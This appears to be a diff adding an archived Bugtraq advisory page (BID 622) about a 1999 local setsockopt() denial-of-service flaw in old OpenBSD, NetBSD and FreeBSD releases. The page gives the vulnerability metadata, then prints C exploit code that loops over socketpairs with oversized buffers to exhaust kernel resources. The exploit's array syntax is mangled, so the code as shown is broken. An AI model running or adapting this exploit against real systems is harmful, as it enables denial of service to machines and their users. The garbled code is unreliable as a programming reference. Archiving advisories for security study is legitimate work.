@@ -1,0 +1,154 @@
+#SpeeDr00t@Black Falcon<br>#bid622<p><b><span style="font-size: 18pt;">Multiple Vendor setsockopt() Denial of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/622/info">info</a><br><a href="http://www.securityfocus.com/bid/622/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/622/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/622/solution">solution</a><br><a href="http://www.securityfocus.com/bid/622/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				622
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 05 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 05 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by L. Sassaman &lt;rabbi@quickie.net&gt; on September 1, 1999. Initially discovered by Sven Berkvens.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					OpenBSD OpenBSD 2.7 <br/>
+					
+				
+					OpenBSD OpenBSD 2.6 <br/>
+					
+				
+					OpenBSD OpenBSD 2.5 <br/>
+					
+				
+					NetBSD NetBSD 1.4.2  x86<br/>
+					
+				
+					NetBSD NetBSD 1.4.2  SPARC<br/>
+					
+				
+					NetBSD NetBSD 1.4.2  arm32<br/>
+					
+				
+					NetBSD NetBSD 1.4.2  Alpha<br/>
+					
+				
+					NetBSD NetBSD 1.4.1  x86<br/>
+					
+				
+					NetBSD NetBSD 1.4.1  SPARC<br/>
+					
+				
+					NetBSD NetBSD 1.4.1  arm32<br/>
+					
+				
+					NetBSD NetBSD 1.4.1  Alpha<br/>
+					
+				
+					NetBSD NetBSD 1.4  x86<br/>
+					
+				
+					FreeBSD FreeBSD 5.0  alpha<br/>
+					
+				
+					FreeBSD FreeBSD 4.0 <br/>
+					
+				
+					FreeBSD FreeBSD 3.5 <br/>
+					
+				
+					FreeBSD FreeBSD 3.4 <br/>
+					
+				
+					FreeBSD FreeBSD 3.3 <br/>
+					
+				
+					FreeBSD FreeBSD 3.2 <br/>
+					
+				
+					FreeBSD FreeBSD 3.1 <br/>
+					
+				
+					FreeBSD FreeBSD 3.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					BSDI BSD/OS 4.0.1 SMP<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	#include       &lt;unistd.h&gt;<br/>#include       &lt;sys/socket.h&gt;<br/>#include       &lt;fcntl.h&gt;<br/><br/>#define                BUFFERSIZE      204800<br/><br/>extern int<br/>main(void)<br/>{<br/>       int             p2, i;<br/>       char            crapBUFFERSIZE;<br/><br/>       while (1)<br/>       {<br/>               if (socketpair(AF_UNIX, SOCK_STREAM, 0, p) == -1)<br/>                       break;<br/>               i = BUFFERSIZE;<br/>               setsockopt(p0, SOL_SOCKET, SO_RCVBUF, &amp;i, sizeof(int));<br/>               setsockopt(p0, SOL_SOCKET, SO_SNDBUF, &amp;i, sizeof(int));<br/>               setsockopt(p1, SOL_SOCKET, SO_RCVBUF, &amp;i, sizeof(int));<br/>               setsockopt(p1, SOL_SOCKET, SO_SNDBUF, &amp;i, sizeof(int));<br/>               fcntl(p0, F_SETFL, O_NONBLOCK);<br/>               fcntl(p1, F_SETFL, O_NONBLOCK);<br/>               write(p0, crap, BUFFERSIZE);<br/>               write(p1, crap, BUFFERSIZE);<br/>       }<br/>       exit(0);<br/>}
+	
+		<ul>
+</ul>
+</div>
